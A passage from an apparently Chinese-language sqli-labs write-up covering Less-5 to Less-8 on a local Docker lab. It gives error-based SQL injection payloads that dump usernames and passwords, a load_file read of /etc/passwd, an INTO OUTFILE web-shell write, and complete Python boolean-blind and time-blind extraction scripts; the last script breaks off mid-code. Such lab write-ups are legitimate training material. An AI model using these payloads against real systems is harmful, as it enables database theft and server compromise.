class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br></div></div><h3 id="报错注入"><a href="#报错注入" class="header-anchor">#</a> 报错注入</h3> <p>主播主播，你的布尔盲注确实很强，但还是太痴操作了，有没有更简单一点的？</p> <p>有的兄弟，有的。既然页面在语法错误时会报错，那么还可以使用报错注入来回显结果</p> <p>使用<code>updatexml()</code>、<code>extractvalue()</code>、<code>floor()</code>等函数，可以回显错误信息，实现爆库爆表爆列爆数据</p> <p>看一下这个函数用法</p> <p><img src="/medias/show-sql/2441.png" alt="2441"></p> <div class="custom-block tip"><p class="custom-block-title">提示</p> <p>报错注入为什么存在错误，还能返回部分语句的结果？</p> <p>sql先检查是否存在语法错误，如果没有，先执行子查询，在进行updatexml函数的调用，最后因为updatexml函数的参数类型错误，导致抛出错误，在报错中，带出了子查询的结果</p></div> <p>流程：</p> <ul><li>检查语法</li> <li>执行子查询</li> <li>执行updatexml函数</li> <li>updatexml函数参数类型错误，抛出错误</li></ul> <p>例如下面这句，不存在语法错误，执行<code>database()</code>函数子查询<code>select database()</code>，再执行<code>concat()</code>函数，最后再拼接时，<code>updatexml</code>函数使用了错误的参数类型，报错:</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>爆库</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>把<code>database()</code>函数位置换成select子句，爆表</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>爆字段</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>爆数据</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>尝试使用<code>extractvalue()</code>、<code>floor()</code>函数</p> <p><code>extractvalue()</code>函数和<code>updatexml()</code>函数使用类似，参数个数不同</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>slect username<span class="token punctuation">,</span>password <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>在这里，<code>extractvalue()</code>函数第二个参数使用了错误的参数<code>0x7e</code>，报错。可以只是<code>concat()</code>函数，使用子查询获取想要的内容，拼接上<code>0x7e</code>，把子查询结果带出来</p> <p><img src="/medias/sqli-labs/7.png" alt="7"></p> <p>爆库</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">0</span>' <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/8.png" alt="8"></p> <p>另外，<code>XPATH syntax error</code>也算是<code>updatexml</code>、<code>extractvalue</code>因为XPATH报错的一个特征吧</p> <h2 id="less-6"><a href="#less-6" class="header-anchor">#</a> Less-6</h2> <p>和上一关less-5相同，换成了<code>&quot;</code>双引号类型</p> <p>上面的盲注脚本和报错注入稍微修改还能用</p> <p><img src="/medias/sqli-labs/11.png" alt="11"></p> <h2 id="less-7"><a href="#less-7" class="header-anchor">#</a> Less-7</h2> <h3 id="读写文件"><a href="#读写文件" class="header-anchor">#</a> 读写文件</h3> <p>这题提示需要<code>use outfile</code>，没有回显，要把数据写入到文件里，可以写入一个木马</p> <p>我的题目环境是使用docker部署的，完整网络根路径我并不知道，但是可以知道现在遇到的题目都是在<code>Less-n</code>目录下</p> <p>回到前面几关，尝试验证路径</p> <p>在<code>Less-1</code>中，使用<code>?id=0' union select 1,2,load_file('/etc/passwd')%23</code>读取<code>/etc/passwd</code>，存在<code>www-data</code>用户，用户目录<code>/var/www/</code>，猜测网站更目录大概是<code>/var/www/html/</code></p> <p><img src="/medias/sqli-labs/12.png" alt="12"></p> <p>尝试读取<code>/var/www/html/Less-1/index.php</code>文件，成功读取到内容，可以验证根目录<code>/var/www/html/</code></p> <p><img src="/medias/sqli-labs/13.png" alt="13"></p> <p>可以尝试在<code>Less-7</code>题目页面写入木马</p> <p>传入参数<code>?id=1</code>、<code>?id=1&quot;</code>时页面正常，传入<code>?id=1'</code>时报错，尝试传入<code>?id=1'%23</code>注释掉后面内容时，页面仍然报错</p> <p><img src="/medias/sqli-labs/14.png" alt="14">
测试可以发现，在传入<code>?id=1'))%23</code>时，页面正常，可以猜测后台sql语句类似</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;select * from users where id = (('<span class="token interpolation"><span class="token variable">$id</span></span>'))&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>尝试写入木马，检查没有语法错误，页面提示<code>You have an error in your SQL syntax</code></p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>?id=0')) union select 1,2,'<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>' into outfile &quot;/var/www/html/Less-7/abc.php&quot;%23
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>回到<code>Less-1</code>环境简单验证，在写入木马时，提示<code>Can't create/write to file '/var/www/html/Less-7/abc.php' (Errcode: 13)</code></p> <p><img src="/medias/sqli-labs/15.png" alt="15"></p> <p>大佬提示<code>错误代码为 13 的时候是没有权限，可以考虑/tmp 等文件夹</code></p> <p><code>/var/www/html/</code>目录没有写的权限，这里不能像其他writeup一样写木马了。尝试把数据库信息写入到<code>/tmp</code>目录</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token string backtick-quoted-string">``</span>`php
url<span class="token operator">/</span>Less<span class="token operator">-</span><span class="token number">7</span><span class="token operator">/</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">0</span><span class="token string single-quoted-string">')) union select 1,2,'</span>fuck' into outfile <span class="token string double-quoted-string">&quot;/tmp/fuck&quot;</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>在<code>Less-1</code>环境里读取，验证成功写入</p> <p><img src="/medias/sqli-labs/16.png" alt="16"></p> <h3 id="解决权限问题"><a href="#解决权限问题" class="header-anchor">#</a> 解决权限问题</h3> <p>这个docker镜像作者可能没考虑到权限问题，可以进入容器给权限</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> sqli-lab /bin/sh
<span class="token function">chmod</span> <span class="token number">777</span> <span class="token parameter variable">-R</span> /var/www/html/
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>现在应该可以正常写入文件了</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>?id=0')) union select 1,2,'<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>' into outfile &quot;/var/www/html/Less-7/abc.php&quot;%23
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/777.png" alt="777"></p> <h3 id="布尔盲注-2"><a href="#布尔盲注-2" class="header-anchor">#</a> 布尔盲注</h3> <p>因为题目还是有两种响应，尝试布尔盲注</p> <ul><li>true : <code>You are in...</code></li> <li>false : <code>You have an error in your SQL syntax</code></li></ul> <p>布尔盲注</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token comment"># 下划线放最后，避免当作统配符吃掉特殊字符</span>
flags <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'</span>
flag <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>

url <span class="token operator">=</span> <span class="token string">&quot;http://127.0.0.1:8080/Less-7/&quot;</span>
i <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;脚本正在运行.......&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    
    <span class="token keyword">for</span> s <span class="token keyword">in</span> flags<span class="token punctuation">:</span>
        <span class="token comment"># 爆库</span>
        <span class="token comment"># id = &quot;0')) or left((select group_concat(schema_name) from information_schema.schemata),&quot; + str(i)+&quot;)='&quot;+ flag + s+&quot;'%23&quot;</span>
        <span class="token comment"># 爆表</span>
        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">&quot;0')) or left((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;)='&quot;</span><span class="token operator">+</span> flag <span class="token operator">+</span> s <span class="token operator">+</span><span class="token string">&quot;'%23&quot;</span>
        <span class="token comment"># 爆字段</span>
        <span class="token comment"># id = &quot;0')) or left((select group_concat(column_name) from information_schema.columns where table_schema=database()),&quot; + str(i)+&quot;)='&quot;+ flag + s+&quot;'%23&quot;</span>

        <span class="token comment"># 测试right函数</span>
        <span class="token comment"># id = &quot;90')) or right((select group_concat(schema_name) from information_schema.schemata),&quot; + str(i)+&quot;)='&quot;+ s + flag +&quot;'%23&quot;</span>
        tmp_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">&quot;?id=&quot;</span> <span class="token operator">+</span> <span class="token builtin">id</span>
        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>tmp_url<span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> <span class="token string">&quot;You are in&quot;</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            i <span class="token operator">+=</span> <span class="token number">1</span>
            flag <span class="token operator">+=</span> s
            <span class="token comment"># 测试right函数</span>
            <span class="token comment"># flag = s + flag</span>
            <span class="token comment"># 最后一次成功拼接作为开始，判断超时</span>
            start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[#]------</span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># 目标服务器性能可能存在差距，适当调整超时时间</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">&gt;</span> <span class="token number">1.5</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;盲注结束，检查flag是否是预期结果！&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;检测到长时间没有再获取到响应，该脚本布尔盲注可能并不适配退出&quot;</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>  
    <span class="token keyword">except</span> NameError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;在第一轮循环中未找到合适的开始字符，检查环境是否适合布尔盲注或扩充flags变量(可能出现的字符&quot;</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br></div></div><p><img src="/medias/sqli-labs/17.png" alt="17"></p> <h3 id="时间盲注"><a href="#时间盲注" class="header-anchor">#</a> 时间盲注</h3> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token comment"># 下划线放最后，避免当作统配符吃掉特殊字符</span>
flags <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'</span>
flag <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>

url <span class="token operator">=</span> <span class="token string">&quot;http://127.0.0.1:8080/Less-7/&quot;</span>
i <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;脚本正在运行.......&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    
    <span class="token keyword">for</span> s <span class="token keyword">in</span> flags<span class="token punctuation">:</span>
        <span class="token comment"># 爆库</span>
        <span class="token comment"># id = &quot;0')) or if((substr((select group_concat(schema_name) from information_schema.schemata),&quot; + str(i)+&quot;,1)='&quot;+ s +&quot;'),sleep(0.1),0)%23&quot;</span>
        <span class="token comment"># 爆表</span>
        <span class="token comment"># id = &quot;0')) or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot; + str(i)+&quot;,1)='&quot;+ s +&quot;'),sleep(0.1),0)%23&quot;</span>
        <span class="token comment"># 爆字段</span>
        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">&quot;0')) or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),&quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;,1)='&quot;</span><span class="token operator">+</span> s <span class="token operator">+</span><span class="token string">&quot;'),sleep(0.1),0)%23&quot;</span>
        tmp_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">&quot;?id=&quot;</span> <span class="token operator">+</span> <span class="token builtin">id</span>
        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>tmp_url<span class="token punctuation">)</span>
        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">&gt;</span> <span class="token number">0.1</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> s
            <span class="token comment"># 当盲注出正确字符时，才去盲注下一位(变量i的作用)</span>
            i <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[#]------result: </span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">elif</span> end <span class="token operator">-</span> start <span class="token operator">&gt;</span> <span class="token number">5</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;跑了这么久，跑完了吗？跑完我给你停了🤓👍&quot;</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br></div></div><h2 id="less-8"><a href="#less-8" class="header-anchor">#</a> Less-8</h2> <h3 id="布尔盲注-3"><a href="#布尔盲注-3" class="header-anchor">#</a> 布尔盲注</h3> <p>看源码里特别的一句，注释掉了mysql抛出错误的代码语句，这题不能再使用报错注入</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token comment">//print_r(mysql_error());</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/18.png" alt="18"></p> <p>通过传入参数<code>?id=1' or 1=1%23</code>、<code>?id=1&quot; or 1=1%23</code>，在<code>?id=1'or 1=1%23</code>时页面正常，还是单引号包裹的<code>id</code></p> <p>布尔盲注</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token comment"># 下划线放最后，避免当作统配符吃掉特殊字符</span>
flags <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'</span>
flag <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>

url <span class="token operator">=</span> <span class="token string">&quot;http://127.0.0.1:8080/Less-8/&quot;</span>
i <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;脚本正在运行.......&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    
    <span class="token keyword">for</span> s <span class="token keyword">in</span> flags<span class="token punctuation">:</span>
        <span class="token comment"># 爆库</span>
        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">&quot;0' or left((select group_concat(schema_name) from information_schema.schemata),&quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;)='&quot;</span><span class="token operator">+</span> flag <span class="token operator">+</span> s<span class="token operator">+</span><span class="token string">&quot;'%23&quot;</span>
        <span class="token comment"># 爆表</span>
        <span class="token comment"># id = &quot;0' or left((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot; + str(i)+&quot;)='&quot;+ flag + s +&quot;'%23&quot;</span>
        <span class="token comment"># 爆字段</span>
        <span class="token comment"># id = &quot;0' or left((select group_concat(column_name) from information_schema.columns where table_schema=database()),&quot; + str(i)+&quot;)='&quot;+ flag + s +&quot;'%23&quot;</span>
        tmp_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">&quot;?id=&quot;</span> <span class="token operator">+</span> <span class="token builtin">id</span>
        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>tmp_url<span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> <span class="token string">&quot;You are in&quot;</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> s
            i <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token comment"># 最后一次成功拼接作为开始，判断超时</span>
            start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[#]------</span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># 目标服务器性能可能存在差距，适当调整超时时间</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">&gt;</span> <span class="token number">1.5</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;盲注结束，检查flag是否是预期结果！&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;检测到长时间没有再获取到响应，该脚本布尔盲注可能并不适配退出&quot;</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>  
    <span class="token keyword">except</span> NameError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;在第一轮循环中未找到合适的开始字符，检查环境是否适合布尔盲注或扩充flags变量(可能出现的字符&quot;</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br></div></div><p><img src="/medias/sqli-labs/19.png" alt="19"></p> <h3 id="时间盲注-2"><a href="#时间盲注-2" class="header-anchor">#</a> 时间盲注</h3> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token comment"># 下划线放最后，避免当作统配符吃掉特殊字符</span>
flags <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'</span>
flag <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>

url <span class="token operator">=</span> <span class="token string">&quot;http://127.0.0.1:8080/Less-8/&quot;</span>
i <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;脚本正在运行.......&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    
    <span class="token keyword">for</span> s <span class="token keyword">in</span> flags<span class="token punctuation">:</span>
        <span class="token comment"># 爆库</span>
        <span class="token comment"># id = &quot;0' or if((substr((select group_concat(schema_name) from information_schema.schemata),&quot; + str(i)+&quot;,1)='&quot;+ s +&quot;'),sleep(0.1),0)%23&quot;</span>
        <span class="token comment"># 爆表</span>
        <span class="token comment"># id = &quot;0' or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot; + str(i)+&quot;,1)='&quot;+ s +&quot;'),sleep(0.1),0)%23&quot;</span>
        <span class="token comment"># 爆字段</span>
